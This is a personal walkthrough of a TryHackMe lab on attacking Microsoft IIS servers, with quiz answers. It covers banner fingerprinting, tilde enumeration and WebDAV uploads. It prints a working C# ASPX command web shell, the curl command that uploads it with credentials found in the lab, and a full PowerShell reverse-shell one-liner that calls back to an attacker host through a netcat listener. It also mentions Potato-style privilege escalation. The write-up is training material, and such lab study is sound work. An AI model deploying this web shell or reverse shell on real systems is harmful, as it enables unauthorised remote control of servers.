# TryHackMe- Web Server Attacks -II
Been busy lately… managed to publish this today. Look at my Linkedin account and you’ll see that I’ve been flying through rooms, but I was too lazy to pause and write about them 🙃

## Task 1 Introduction

I have deployed the virtual machines! Basically what we are going to do:

* Fingerprint an IIS server to determine its version and enabled features
* Use IIS tilde enumeration to discover hidden files and directories
* Exploit a misconfigured WebDAV installation to upload and execute an ASPX command shell
* Understand how ASPX web shells work and what access they provide
* Learn automation techniques to fingerprint and enumerate an IIS server

## Task 2 IIS Fingerprinting and Enumeration
So IIS version numbers map directly to Windows Server releases. 
This is important because many CVEs are version specific. We need to know about IIS Architecture because it helps you helps to know where vulnerabilities live and why certain attacks work.

A request arriving at an IIS server goes through:

**HTTP.sys** -> Receives all HTTP traffic at the kernel level

**W3SVC / WAS** -> Manages application pools and worker processes

**w3wp.exe** -> Runs under the app pool identity (e.g., IIS APPPOOL|<pool v. name>)

**ASP/NET runtime/handler mappings**: Processes the request and maps it to the appropriate handler (ASP.NET, static, etc.)

**Application code (aspx, static files, etc.)** -> Executes application code or serves static content

---

The fastest way to fingerprint IIS is to read the response headers. You grab the HTTP banner using

`curl -I http://LAB_MACHINE_IP`

---

To detect WebDAV, use

`curl -X OPTIONS http://LAB_MACHINE_IP -sv 2>&1 | grep -E "Allow:|DAV:"`

“If WebDAV is enabled, the response includes a DAV: header and an extended Allow: list.”

---

“Knowing that WebDAV is enabled is not enough. You need to know whether you can upload files and, critically, whether uploaded files are executed. The approach is straightforward: PUT a test file, then GET it and observe the response. A 200 with output means the server executed it; a 200 with your raw file content means it was served statically.”

`curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>'
http://LAB_MACHINE_IP/webdav/test.aspx`

Using curl without credentials, a 401 Created on the PUT confirms no write access. A 401 on the GET with rendered output (not raw source) confirms execution.

---

Then in the reading material provided, we see some basic normal vs suspicious traffic patterns. We will get familiar with those later on.

_What HTTP response header reveals the IIS version?_

**Server**

---


_What is the HTTP response code after executing the PUT request on the /webdavdirectory?_

Running

`curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://LAB_MACHINE_IP/webdav/test.aspx`

We see:

PUT aspx: 401

**401**

## Task 3 IIS Tilde (Short Filename) Enumeration

Some material on what is the 8.3 Short Filename Problem and how it works.

_What character in a URL path triggers the IIS tilde enumeration response difference?_

**~**

---

_What legacy Windows filename format does the tilde enumeration vulnerability exploit? (Answer Format: X.X)_

**8.3**

---

_What password is stored in the file discovered through tilde enumeration?_

`curl http://10.49.169.234/BackupFiles/`

The output tells us the directory name starts with backup. Directory listing is enabled: it reveals the file webdav_notes.txt.

Running

`curl http://10.49.169.234/BackupFiles/webdav_notes.txt`

to access the WebDav credentials shows the output

```WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

(Save these credentials we will use them in task 4)

## Task 4 WebDav Exploitation: Uploading an ASPX Shell

Some important things to remember: the three conditions required for a successful shell upload is

* WebDAV is enabled on the target directory
* Valid credentials with Write permission on the WebDAV directory
* Script Execute is set, IIS passes .aspx requests to the ASP.NET handler rather than serving them as static content

_What HTTP status code confirms a file was successfully created via PUT?_

`nano cmd.aspx`

With the text editor opened, save

```<​%@ Page Language="C#" %​>
<​% 
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
```

Save with control X, press Y then return.

Using curl with NTLM authentication to PUT the file directly to the WebDAV directory: run

`curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://LAB_MACHINE_IP/webdav/cmd.aspx`

The output **201 created** confirms the file was written to the server.

---

_What curl flag is required to authenticate with NTLM when uploading via WebDAV?_

**-- ntlm**

## Task 5 ASPX Webshells

ASPX Webshells, and also procedures of how to set one up- we will use later in the question.

_After triggering the ASPX shell, what user account is returned by the whoami command? (Answer Format: lowercase, e.g., nt authority\system)_

Just now we uploaded cmd.aspx to /webdav/- we can now run commands by passing them as the cmd query parameter.

We can try executing a few commands:

```curl "http://LAB_MACHINE_IP/webdav/cmd.aspx？cmd=whoami"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=hostname"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=ipconfig"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=dir+C:\\"
```

URL-encode spaces as `+` or `%20` in the cmd parameter.

Then we need to escalate to an reverse shell:

Open another terminal tab and run

`nc -lvnp 443`

Go back to our first terminal and run

```curl -G "http://YOUR_TARGET_IP/webdav/cmd.aspx" \
  --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'YOUR_ATTACKBOX_IP'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

* The \ tells the terminal that the command is too long for one line and continues onto the next line.
* `'"'"'`Bash handles quotes strictly- the payload uses `‘’` inside a command already using `‘’`, so the double quotes I added prevents Linux from getting confused.
* `--data-urlencode` helps the command to safely execute without interruptions or errors.

Going back to the netcat terminal, we see the connection is recieved. Press enter and we see:

`PS C:\windows\system32\inetsrv>`

Congrats! You have an interactive PowerShell session.

Run

`whoami`

in the first terminal and we have the answer:

**iis apppool\defaultapppool**

What Windows privilege, visible in whoami /priv output from the reverse shell, enables Potato-style privilege escalation from an IIS shell?

Run

`whoami /priv`

and we see a list of privileges

<img width="1641" height="691" alt="image" src="https://github.com/user-attachments/assets/5dedda62-b2fc-470d-a149-2d71c2934fcc" />

The answer is :

**SeImpersonatePrivilege**

Quoting from the material:
“The SeImpersonatePrivilege entry is the one that matters most for post-exploitation. This privilege allows a process to impersonate any user who connects to it at the Windows token level. It is what makes PrintSpoofer, JuicyPotato, and GodPotato work. Potato-style tools force a SYSTEM-level process to authenticate to an attacker-controlled named pipe, then use SeImpersonatePrivilege to steal the SYSTEM token from that authentication, which is why this privilege is the standard escalation path from any network service identity. These tools abuse impersonation to escalate from iis apppool\defaultapppool to SYSTEM.
Privilege escalation from this point is outside the scope of this room. What is worth understanding is that landing an ASPX shell on a default IIS installation gives you a predictable starting privilege, and that privilege has a well-documented escalation path.”

## Task 6 IIS Misconfigurations

We cover 7 misconfigurations:

* Directory Listing Enabled
* HTTP PUT and DELETE Without Authentication
* web.config Exposure
* Verbose Error Messages
* trace.axd Left Enabled
* TRACE Method Enabled
* Application Pool Running as a Privileged Account

_Navigate to the /uploads/ directory on the target. What sensitive file extension is visible in the directory listing? (Answer Format: include the dot, e.g., .bak)_

Run

`curl http://10.48.185.154/uploads/`

The output I got was

<img width="1632" height="277" alt="image" src="https://github.com/user-attachments/assets/2d00f03d-996c-47b0-9aa5-e9be89f509b3" />

We see config.bak.
**.bak** is a sensitive file extension.

---

_What ASP.NET diagnostic handler URL path should be disabled in production as it can expose session data, cookies, and request history?_

**trace.axd**

(The material provided explains it)

## Task 7 Automation

Reading about what scripts to reach for and what their output means-

_What nmap NSE script enumerates allowed HTTP methods on a web server?_

**http-methods**

## Task 8 Conclusion

“You have worked through the IIS attack chain from initial reconnaissance to interactive shell access, and covered a survey of misconfigurations that appear across real-world engagements. The techniques here appear in public incident reports from major threat actor groups and in pentest findings across enterprise environments.”

We are done! That’s all for today, and thank you for reading all the way to the end. Please star this respo if you found it helpful!
